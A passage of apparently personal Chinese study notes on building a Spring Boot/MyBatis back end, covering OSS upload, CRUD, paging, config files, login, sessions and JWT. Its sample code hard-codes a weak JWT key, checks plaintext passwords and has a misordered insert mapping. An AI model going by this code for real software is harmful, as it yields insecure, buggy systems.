clientBuilderConfiguration.setSignatureVersion(SignVersion.V4);\n                OSS ossClient = OSSClientBuilder.create()\n                        .endpoint(endpoint)\n                        .credentialsProvider(credentialsProvider)\n                        .clientConfiguration(clientBuilderConfiguration)\n                        .region(region)\n                        .build();\n\n                try {\n                        InputStream inputStream = file.getInputStream();\n                        // 创建PutObjectRequest对象。\n                        PutObjectRequest putObjectRequest = new PutObjectRequest(bucketName, fileName, inputStream);\n                        // 创建PutObject请求。\n                        PutObjectResult result = ossClient.putObject(putObjectRequest);\n\n                        String url = endpoint.split(\"//\")[0]+\"//\"+bucketName+\".\"+endpoint.split(\"//\")[1]+\"/\"+fileName;\n                        return url;\n                } catch (OSSException oe) {\n                        log.info(\"Caught an OSSException, which means your request made it to OSS, \"\n                                + \"but was rejected with an error response for some reason.\");\n                        log.info(\"Error Message:\" + oe.getErrorMessage());\n                        log.info(\"Error Code:\" + oe.getErrorCode());\n                        log.info(\"Request ID:\" + oe.getRequestId());\n                        log.info(\"Host ID:\" + oe.getHostId());\n                } catch (ClientException ce) {\n                        log.info(\"Caught an ClientException, which means the client encountered \"\n                                + \"a serious internal problem while trying to communicate with OSS, \"\n                                + \"such as not being able to access the network.\");\n                        log.info(\"Error Message:\" + ce.getMessage());\n                } finally {\n                        if (ossClient != null) {\n                                ossClient.shutdown();\n                        }\n                }\n                return null;\n        }\n}\n```\n\n##### Controller层\n\n```java\n@Slf4j\n@RestController\n@RequestMapping(\"/upload\")\npublic class UploadController {\n        @Autowired\n        private AliOSSUtils aliOSSUtils;\n\n        @PostMapping\n        public Result upload(MultipartFile image) throws Exception {\n                log.info(\"接受到文件:{}\",image.getOriginalFilename());\n\n                String url = aliOSSUtils.upload(image);\n\n                if(url != null){\n                        log.info(\"上传文件的url:{}\",url);\n                        return Result.success(url);\n                }\n                return Result.error(\"上传出错\");\n        }\n}\n```\n\n##### 测试\n\n![image-20250529141610713](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529141610713.png)\n\n![image-20250529142949932](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529142949932.png)\n\n\n\n## 案例\n\n![image-20250501194904854](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250501194904854.png)\n\n### 开发规范\n\n![image-20250501200003215](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250501200003215.png)\n\n#### Restful\n\n![image-20250501200305519](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250501200305519.png)\n\n![image-20250501200336571](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250501200336571.png)\n\n#### 统一响应结果\n\n![image-20250501200425157](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250501200425157.png)\n\n### 开发流程\n\n![image-20250501200541756](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250501200541756.png)\n\n### 部门管理\n\n#### 部门管理-查询\n\n##### 接口文档：\n\n![image-20250502104701029](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502104701029.png)\n\n![image-20250502104743935](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502104743935.png)\n\n```java\n//使用该注解就不用自己new日志对象\n@Slf4j\n@RestController\npublic class deptController {\n        @RequestMapping(\"/dept\")\n        public Result list(){\n                log.info(\"查询所有部门信息\");\n                return Result.Success();\n        }\n}\n```\n\nps：构建项目时不要选lombok，否则要在pom.xml中注释以下内容：\n\n![image-20250502110941701](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502110941701.png)\n\n否则报错：\n\n![image-20250502110956067](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502110956067.png)\n\n##### postman测试：\n\n![image-20250502111138681](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502111138681.png)\n\n##### 日志输出：\n\n![image-20250502111156255](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502111156255.png)\n\n##### 指定请求方法\n\n```java\n@RequestMapping(value = \"/depts\",method = RequestMethod.GET)\n//简化版本\n @GetMapping(\"depts\")\n```\n\n##### 注入依赖\n\nController层\n\n```java\n@Slf4j\n@RestController\npublic class deptController {\n        @Autowired\n        private deptService service;\n        @GetMapping(\"depts\")\n        public Result list() {\n                log.info(\"查询所有部门信息\");\n                //查询所有部门信息\n                List<Dept> deptList = service.list();\n                return Result.success(deptList);\n        }\n}\n```\n\nService层\n\n```java\n@Service\npublic class deptImpl implements deptService {\n        @Autowired\n        private deptMapper mapper;\n\n        @Override\n        public List<Dept> list() {\n                return mapper.list();\n        }\n}\n```\n\nMapper层\n\n```java\n@Mapper\npublic interface deptMapper {\n        @Select(\"select * from dept\")\n        public List<Dept> list();\n}\n```\n\n![image-20250502112504837](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502112504837.png)\n\n#### 部门管理-删除\n\n##### 接口文档\n\n![image-20250502113702239](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502113702239.png)\n\n##### 流程\n\n![image-20250502113924420](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502113924420.png)\n\n##### Controller层\n\n```java\n@DeleteMapping(\"/depts/{id}\")\npublic Result delete(@PathVariable Integer id){\n    log.info(\"根据id删除部门:{}\",id);\n    service.delete(id);\n    return Result.success();\n}\n```\n\n\n\n##### Service层\n\n```java\n@Override\npublic void delete(Integer id) {\n    mapper.deleteById(id);\n}\n```\n\n\n\n##### Mapper层\n\n```java\n@Delete(\"delete from dept where id=#{id}\")\nvoid deleteById(Integer id);\n```\n\n##### postman测试\n\n![image-20250502114723744](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502114723744.png)\n\n##### 执行结果\n\n![image-20250502114642751](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502114642751.png)\n\n![image-20250502114646465](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502114646465.png)\n\n#### 部门管理-新增\n\n##### 接口文档\n\n![image-20250502115239802](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502115239802.png)\n\n![image-20250502115559884](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502115559884.png)\n\n##### Controller层\n\n```java\n@PostMapping(\"/depts\")\npublic Result add(@RequestBody Dept dept){\n    log.info(\"新增部门{}\",dept);\n    service.add(dept);\n    return Result.success();\n}\n```\n\n\n\n##### Service层\n\n```java\n@Override\npublic void add(Dept dept){\n    dept.setCreateTime(LocalDate.now());\n    dept.setUpdateTime(LocalDate.now());\n\n    mapper.insert(dept);\n}\n```\n\n\n\n##### Mapper层\n\n```java\n@Insert(\"insert into dept (name,create_time,update_time) values (#{name},#{createTime},#{updateTime})\")\nvoid insert(Dept dept);\n```\n\n\n\n##### postman测试\n\n![image-20250502120724193](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502120724193.png)\n\n##### 结果\n\n![image-20250502120905590](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502120905590.png)\n\n![image-20250502120921945](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502120921945.png)\n\n#### 简化RequestMapping\n\n![image-20250502121354174](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502121354174.png)\n\n![image-20250502121723903](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250502121723903.png)\n\n### 员工管理\n\n#### 分页查询\n\n##### 分析\n\n![image-20250513210042683](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210042683.png)\n\n##### 接口文档\n\n![image-20250513210239794](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210239794.png)\n\n![image-20250513210246107](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210246107.png)\n\n![image-20250513210255167](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210255167.png)\n\n![image-20250513210324909](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210324909.png)\n\n![image-20250513210538282](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210538282.png)\n\n##### 封装实体类\n\n![image-20250513210839682](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513210839682.png)\n\n```java\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class pageBean {\n        private Long total;\n        private List rows;\n}\n```\n\n##### 实现\n\n###### Mapper层\n\n```java\n@Mapper\npublic interface EmpMapper {\n        /**\n         * 查询总记录数\n         * @return\n         */\n        @Select(\"select count(*) from emp\")\n         Long count();\n\n        /**\n         *\n         * @param page:起始页\n         * @param pageSize:查多少页\n         * @return\n         */\n        @Select(\"select * from emp limit #{page},#{pageSize}\")\n         List<Emp> page(Integer page,Integer pageSize);\n}\n```\n\n###### Service层\n\n```java\n@Service\npublic class empImpl implements empService {\n        @Autowired\n        EmpMapper empMapper;\n\n        @Override\n        public PageBean page(Integer page, Integer pageSize) {\n                Long total = empMapper.count();\n                Integer start = (page - 1) * pageSize;\n                List<Emp> rows = empMapper.page(start, pageSize);\n                //封装pageBean\n                PageBean pageBean = new PageBean(total,rows);\n                return pageBean;\n        }\n}\n```\n\n\n\n###### Controller层\n\n![image-20250513211738018](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513211738018.png)\n\n用@RequestParam(defaultValue=\"\")设置参数默认值\n\n```java\n@RestController\npublic class empController {\n        @GetMapping(\"/emps\")\n        public Result page(@RequestParam(defaultValue = \"1\") Integer page, @RequestParam(defaultValue = \"10\") Integer pageSize){\n                return new Result();\n        }\n}\n```\n\n日志输出\n\n```java\nlog.info(\"分页查询,分页查询页码为{},每页记录数为{}\",page,pageSize);\n```\n\n调用Service层\n\n```java\nPageBean pageBean = empservice.page(page,pageSize);\n```\n\n```java\n@Slf4j\n@RestController\npublic class empController {\n        @Autowired\n        empService empservice;\n        @GetMapping(\"/emps\")\n        public Result page(@RequestParam(defaultValue = \"1\") Integer page, @RequestParam(defaultValue = \"10\") Integer pageSize){\n                log.info(\"分页查询,起始{},查询{}页\",page,pageSize);\n//                调用service层\n                PageBean pageBean = empservice.page(page,pageSize);\n                return Result.success(pageBean);\n        }\n}\n```\n\n##### 测试\n\npostman\n\n![image-20250513215109589](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513215109589.png)\n\n前后端联调\n\n![image-20250513215305299](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513215305299.png)\n\n##### PageHelper插件\n\n![image-20250524165534782](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250524165534782.png)\n\n引入依赖\n\n这里的版本不能按照课件的1.4.2，否则会强转异常(ClassCastException)\n\n```xml\n<dependency>\n    <groupId>com.github.pagehelper</groupId>\n    <artifactId>pagehelper-spring-boot-starter</artifactId>\n    <version>1.4.6</version>\n</dependency>\n```\n\nEmpMapper\n\n```java\n@Select(\"select* from emp\")\nList<Emp> list();\n```\n\nEmpServer的实现类\n\n```java\n@Override\npublic PageBean page(Integer page, Integer pageSize) {\n    //设置分页参数\n    PageHelper.startPage(page,pageSize);\n\n    //执行查询\n    List<Emp> empList = empMapper.list();\n    Page<Emp> page1 = (Page<Emp>)empList;\n\n    //封装bean对象\n    PageBean pageBean = new PageBean(page1.getTotal(),page1.getResult());\n    return pageBean;\n}\n```\n\n#### 条件分页查询\n\n##### 接口文档\n\n![image-20250527201357121](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527201357121.png)\n\n##### Controller\n\n```java\n//方法声明\npublic Result page(\n    @RequestParam(required = false) String name,\n    @RequestParam(required = false) Short gender,\n    @RequestParam(required = false) @DateTimeFormat(pattern = \"yyyy-MM-dd\") LocalDate begin, \n    @RequestParam(required = false) @DateTimeFormat(pattern = \"yyyy-MM-dd\") LocalDate end, \t\t\t\t\t                         @RequestParam(defaultValue = \"1\") Integer page, \n    @RequestParam(defaultValue = \"10\") Integer pageSize\n)\n```\n\n##### Service层\n\n```java\n@Override\npublic PageBean page(String name, Short gender, LocalDate begin, LocalDate end, Integer page, Integer pageSize) {\n    PageHelper.startPage(page,pageSize);\n\n    List<Emp>  empList = empMapper.page(name, gender, begin, end);\n    Page<Emp> empPage = (Page<Emp>) empList;\n    PageBean pageBean = new PageBean(empPage.getTotal(), empPage.getResult());\n\n    return pageBean;\n}\n```\n\n##### Mapper层\n\n```java\n/**\n* @param name\n* @param gender\n* @param begin 起始create_time\n* @param end   中止create_time\n* @return\n*/\nList<Emp> page(String name, Short gender, LocalDate begin, LocalDate end);\n```\n\n使用了PageHelper之后，Mapper中就不要再使用page与pageSize参数，否则会导致生成的sql变为\n\n```sql\nSELECT count(0) FROM emp LIMIT ?, ?\n```\n\n就查不到了\n\n##### XML映射文件\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"https://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<!--mapper根标签-->\n<mapper namespace=\"com.wwwtty.springmybatisdemo.Mapper.EmpMapper\">\n        <!--    id:Mapper类中的方法名    -->\n        <!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List<User>,填的就是User的全类名     -->\n        <select id=\"page\" resultType=\"com.wwwtty.springmybatisdemo.pojo.Emp\">\n            select * from emp\n                <where>\n                    \t<!-- 这里还需要判断空字符串，否则会多拼上name like %% -->\n                        <if test=\"name != null and name != ''\">\n                            name like concat('%',#{name},'%')\n                        </if>\n                        <if test=\"gender != null\">\n                            and gender = #{gender}\n                        </if>\n                        <if test=\"begin != null and end != null\">\n                            and entrydate between #{begin} and #{end}\n                        </if>\n                </where>\n        </select>\n</mapper>\n```\n\n#### 删除员工\n\n##### 接口文档\n\n![image-20250527204631668](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527204631668.png)\n\n![image-20250527204708322](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527204708322.png)\n\n![image-20250527204730007](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527204730007.png)\n\n##### Controller层\n\n```\n请求方法为Delete,@DeleteMapping({ids})注解;路径参数ids前加上@PathVariable\n```\n\n```java\n@DeleteMapping(\"/{ids}\")\npublic Result delete(@PathVariable List<Integer> ids){\n    log.info(\"批量删除ids:{}\",ids);\n\n    empservice.delete(ids);\n\n    return Result.success();\n}\n```\n\n##### Service层\n\n```java\n@Override\npublic void delete(List<Integer> ids) {\n    empMapper.delete(ids);\n}\n```\n\n##### Mapper层\n\n对应sql:\n\n```sql\ndelete from emp where id in (1,2,3)\n```\n\nxml映射文件中:< foreach >实现对数组的遍历\n\n```xml\n<delete id=\"delete\">\n    delete from emp where id in\n    <foreach collection=\"ids\" item=\"id\" separator=\",\" open=\"(\" close=\")\">\n        #{id}\n    </foreach>\n</delete>\n```\n\n#### 新增员工\n\n##### 接口文档\n\n![image-20250527210259743](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527210259743.png)\n\n![image-20250527210344910](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527210344910.png)\n\n![image-20250527210405378](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527210405378.png)\n\n##### Controller层\n\n```java\n//前端发送json请求体，封装为pojo实体类\n@PostMapping\npublic Result save(@RequestBody Emp emp){\n    empservice.save(emp);\n\n    return Result.success();\n}\n```\n\n##### Service层\n\n```java\n@Override\npublic void save(Emp emp) {\n    emp.setCreateTime(LocalDateTime.now());\n    emp.setUpdateTime(LocalDateTime.now());\n\n    empMapper.insert(emp);\n}\n```\n\n##### Mapper层\n\n```java\nvoid insert(Emp emp);\n```\n\nxml映射文件\n\n```xml\n        <insert id=\"insert\">\n                insert into emp (username, name, gender, image, job, entrydate, dept_id,create_time,update_time) values (#\t\t\t\t\t\t{username},#{name},#{gender},#{image},#{deptId},#{entryDate},#{job},#{createTime},#{updateTime})\n        </insert>\n```\n\n#### 查询回显\n\n##### 接口文档\n\n![image-20250529143643189](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529143643189.png)\n\n![image-20250529143712971](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529143712971.png)\n\n![image-20250529143729208](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529143729208.png)\n\n##### Contoller层\n\n```java\n@GetMapping(\"/{id}\")\npublic Result getById(@PathVariable Integer id){\n    log.info(\"查询id:{}\",id);\n\n    return Result.success(empService.getById(id));\n}\n```\n\n\n\n##### Service层\n\n```java\n@Override\npublic Emp getById(Integer id) {\n    return empMapper.selectById(id);\n}\n```\n\n\n\n##### Mapper层\n\n```java\n@Select(\"select* from emp where id=#{id}\")\nEmp selectById(Integer id);\n```\n\n##### 测试\n\n![image-20250529144631670](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529144631670.png)\n\n![image-20250529144740720](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529144740720.png)\n\n#### 修改员工\n\n##### 接口文档\n\n![image-20250529144855764](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529144855764.png)\n\n![image-20250529144913450](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529144913450.png)\n\n![image-20250529144930073](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529144930073.png)\n\n##### Contoller层\n\n```java\n@PutMapping\npublic Result update(@RequestBody Emp emp){\n    log.info(\"要修改的员工:{}\",emp);\n\n    empService.update(emp);\n\n    return Result.success();\n}\n```\n\n\n\n##### Service层\n\n```java\n@Override\npublic void update(Emp emp) {\n    emp.setUpdateTime(LocalDateTime.now());\n    empMapper.update(emp);\n}\n```\n\n\n\n##### Mapper层\n\n```java\n        <update id=\"update\">\n                UPDATE emp\n                <set>\n                        <if test=\"username != null and username != ''\">\n                                username =\n                                #{username},\n                        </if>\n                        <if test=\"password != null and password != ''\">\n                                password =\n                                #{password},\n                        </if>\n                        <if test=\"name != null and name != ''\">\n                                name =\n                                #{name},\n                        </if>\n                        <if test=\"gender != null\">\n                                gender =\n                                #{gender},\n                        </if>\n                        <if test=\"image != null and image != ''\">\n                                image =\n                                #{image},\n                        </if>\n                        <if test=\"job != null\">\n                                job =\n                                #{job},\n                        </if>\n                        <if test=\"entryDate != null\">\n                                entrydate =\n                                #{entryDate},\n                        </if>\n                        <if test=\"deptId != null\">\n                                dept_id =\n                                #{deptId},\n                        </if>\n                        <if test=\"createTime != null\">\n                                create_time =\n                                #{createTime},\n                        </if>\n                        <if test=\"updateTime != null\">\n                                update_time =\n                                #{updateTime}\n                        </if>\n                </set>\n                WHERE id = #{id}\n        </update>\n```\n\n##### 测试\n\n![image-20250529151243177](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529151243177.png)\n\n# 配置文件\n\n## 对比\n\n![image-20250529153509010](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529153509010.png)\n\n## application.properties\n\n![image-20250529151846216](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529151846216.png)\n\n```java\n//类中\n        @Value(\"${aliyun.oss.endpoint}\")\n        private String endpoint;\n        @Value(\"${aliyun.oss.bucketName}\")\n        private String bucketName;\n        @Value(\"${aliyun.oss.region}\")\n        private String region;\n```\n\n```properties\n#配置文件application.properties\naliyun.oss.endpoint=https://oss-cn-chengdu.aliyuncs.com\naliyun.oss.bucketName=k4n9l4n\naliyun.oss.region=cn-chengdu\n```\n\n### 调试\n\n注入成功\n\n![image-20250529152727739](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529152727739.png)\n\n## yaml\n\n后缀为.yml / .yaml\n\n![image-20250529153128171](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529153128171.png)\n\n配置文件命名为application.yaml；出现spring图标，说明被识别\n\n写入:\n\n```yaml\nserver:\n  port: 9000\n```\n\n测试:\n\n![image-20250529153314006](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529153314006.png)\n\n##### 语法\n\n![image-20250529153707095](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529153707095.png)\n\n### 定义对象/Map\n\n```yaml\nUser:\n  name: 淳平\n  age: 24\n```\n\n### 定义数组/List/Set\n\n```yaml\nList:\n  - 114514\n  - 1919810\n```\n\n### 改写application.properties\n\n```yaml\nspring:\n  application:\n    name: Spring-Mybatis-demo\n  #  数据库连接信息\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/spring_demo\n    username: root\n    password: 114514\n  servlet:\n    multipart:\n      max-file-size: 10MB\n      max-request-size: 100MB\n\n#mybatis\nmybatis:\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl\n    map-underscore-to-camel-case: true\n\n#aliyun OSS\naliyun:\n  oss:\n    endpoint: https://oss-cn-chengdu.aliyuncs.com\n    bucketName: k4n9l4n\n    region: cn-chengdu\n```\n\n## @ConfigurationProperties注解\n\n问题分析:配置文件项多了，就有很多成员变量要加上@Value注解，很繁琐\n\n![image-20250529155439654](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529155439654.png)\n\n```java\n@ConfigurationProperties(prefix = \"前缀\")\n```\n\n```java\n@Data\n@Component\n@ConfigurationProperties(prefix = \"aliyun.oss\")\npublic class AliOssProperties {\n        private String endpoint;\n        private String bucketName;\n        private String region;\n}\n```\n\n```java\n@Slf4j\n@Component\npublic class AliOSSUtils {\n        @Autowired\n        private AliOssProperties aliOssProperties;\n\n        /**\n         * 实现上传图片到OSS\n         */\n        public String upload(MultipartFile file) throws Exception {\n                String endpoint = aliOssProperties.getEndpoint();\n                String bucketName = aliOssProperties.getBucketName();\n                String region = aliOssProperties.getRegion();\n        }\n}\n```\n\n调试\n\n![image-20250529160323427](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529160323427.png)\n\n### 与@Value的区别\n\n```bash\n#@Value只能一个一个注入外部属性\n\n#@ConfigurationProperties可以批量注入外部属性到bean对象中\n```\n\n# 登录\n\n## 登录功能\n\n```sql\n-- 用到的sql\nselect* from emp where username = \"xxx\" and password = \"xxx\"\n```\n\n### 接口文档\n\n![image-20250529162704456](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529162704456.png)\n\n![image-20250529162802585](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529162802585.png)\n\n![image-20250529162830108](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529162830108.png)\n\n![image-20250529163032540](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529163032540.png)\n\n### Controller层\n\n```java\n@RestController\n@Slf4j\n@RequestMapping(\"/login\")\npublic class LoginController {\n\n        @Autowired\n        private EmpService empService;\n\n        @PostMapping\n        public Result login(@RequestBody Emp emp){\n                log.info(\"员工登录:{}\",emp);\n\n                Emp e = empService.login(emp);\n\n                return e==null?Result.error(\"用户名或密码错误\"):Result.success();\n        }\n}\n```\n\n### Service层\n\n```java\n@Override\npublic Emp login(Emp emp) {\n    return empMapper.getByUsernameAndPassword(emp);\n}\n```\n\n\n\n### Mapper层\n\n```java\n@Select(\"select * from emp where username=#{username} and password = #{password}\")\nEmp getByUsernameAndPassword(Emp emp);\n```\n\n测试:\n\n![](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529164728339.png)\n\n## 校验\n\n只这样验证会未授权访问，即使退出登录了，输入原来的url就进入了后台\n\nhttp是无状态的，请求其他业务时，并不知道用户在登录业务这块到底登录了没有\n\n![image-20250529165459437](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529165459437.png)\n\n### 会话技术\n\n![image-20250529165935261](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529165935261.png)\n\n#### Cookie\n\n![image-20250529170622625](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529170622625.png)\n\n```java\n@RestController\n@RequestMapping(\"/cookie\")\npublic class CookieController {\n//        获取cookie\n        @GetMapping(\"/get\")\n        public Result get(HttpServletRequest request){\n                Cookie[] cookies = request.getCookies();\n\n                for (Cookie cookie : cookies) {\n                        if(\"test\".equals(cookie.getName())){\n                                System.out.println(cookie.toString());\n                        }\n                }\n\n                return Result.success();\n        }\n//        设置cookie\n        @GetMapping(\"/set\")\n        public Result set(HttpServletResponse response){\n                response.addCookie(new Cookie(\"test\",\"114514\"));\n                return Result.success();\n        }\n}\n```\n\n测试:\n\n![image-20250529171354299](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529171354299.png)\n\n![image-20250529171610496](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529171610496.png)\n\n![image-20250529171517963](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529171517963.png)\n\n##### 优缺点\n\n![image-20250529171749062](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529171749062.png)\n\n跨域:\n\n三个维度有一个不同就是跨域\n\n![image-20250529171905019](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529171905019.png)\n\n#### Session\n\n![image-20250529172052773](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529172052773.png)\n\n```java\n@RestController\n@Slf4j\n@RequestMapping(\"/session\")\npublic class SessionController {\n        @GetMapping(\"/set\")\n        public Result set(HttpSession session){\n                log.info(\"Session-ID:{}\",session.hashCode());\n                session.setAttribute(\"Admin\",\"Admin\");\n                return Result.success();\n        }\n\n        @GetMapping(\"/get\")\n        public Result get(HttpServletRequest request){\n                HttpSession session = request.getSession();\n                \n                log.info(\"Session-ID:{}\",session.hashCode());\n\n                Object sessionAttribute = session.getAttribute(\"Admin\");\n\n                return Result.success(sessionAttribute);\n        }\n}\n```\n\n测试:\n\n/session/get\n\n![image-20250529173000207](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529173000207.png)\n\n响应的key:\n\n![image-20250529173147455](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529173147455.png)\n\n/session/set\n\n![image-20250529173035271](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529173035271.png)\n\n日志输出\n\n![image-20250529173050875](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529173050875.png)\n\n##### 优缺点\n\n会出现同一个浏览器的两个请求获取到不同的sessionID\n\n![image-20250529173402494](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529173402494.png)\n\n### 令牌\n\n![image-20250529185829749](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529185829749.png)\n\n#### JWT令牌\n\n\n\n![image-20250529190221636](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529190221636.png)\n\n![image-20250529190319157](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529190319157.png)\n\n#### 生成\n\n使用的算法\n\n![image-20250529190913764](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529190913764.png)\n\n生成jwt的操作\n\n```java\n@Test\npublic void testGenJWT(){\n    Map<String,Object> claims = new HashMap<>();\n\n    claims.put(\"id\",1);\n    claims.put(\"name\",\"淳平\");\n\n    String jwt = Jwts.builder()\n        .signWith(SignatureAlgorithm.HS256, \"114514\") //算法以及密钥\n        .addClaims(claims) //自定义内容(Payload)\n        .setExpiration(new Date(System.currentTimeMillis() + 3600 * 1000)) //设置到期时间，这里设置1h 3600*1000ms\n        .compact();\n\n    System.out.println(jwt);\n}\n```\n\n![image-20250529192009773](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529192009773.png)\n\n将生成的令牌放到官网进行解码\n\n![image-20250529191955632](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529191955632.png)\n\n我们只是简单测试一下jwt的生成，可以注释掉SpringBootTest注解，这样就不会加载整个项目\n\n![image-20250529191711807](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529191711807.png)\n\n既然生成了，那我们如何解析呢\n\n#### 解析\n\n```java\n        @Test\n        public void parseJwt() {\n                Claims claims = Jwts.parser()\n                        .setSigningKey(\"114514\") //密钥\n                        .parseClaimsJws(\"\") //前一步生成的令牌,parseClaimsJws千万不要把Jws写错成Jwt\n                        .getBody(); //获取payload部分\n\n                System.out.println(claims);\n        }\n```\n\n![image-20250529192851527](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529192851527.png)\n\n```bash\n#JWT校验时用到签名密钥，必须和生成JWT令牌时使用的密钥是配套的\n#如果JWT令牌解析校验时报错，则JWT令牌被篡改或失效，令牌非法\n```\n\n#### 案例:\n\n接口文档\n\n![image-20250529193323545](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529193323545.png)\n\nJWT令牌工具类\n\n```java\npublic class JWTUtils {\n\n        private static String signKey = \"114514\"; //密钥;\n        private static Long expire = 43200000L; //12h过期\n\n        /**\n         * 生成JWT令牌\n         * @param claims JWT第二部分负载 payload 中存储的内容\n         * @return\n         */\n        public static String generateJwt(Map<String, Object> claims){\n                String jwt = Jwts.builder()\n                        .addClaims(claims)\n                        .signWith(SignatureAlgorithm.HS256, signKey)\n                        .setExpiration(new Date(System.currentTimeMillis() + expire))\n                        .compact();\n                return jwt;\n        }\n\n        /**\n         * 解析JWT令牌\n         * @param jwt JWT令牌\n         * @return JWT第二部分负载 payload 中存储的内容\n         */\n        public static 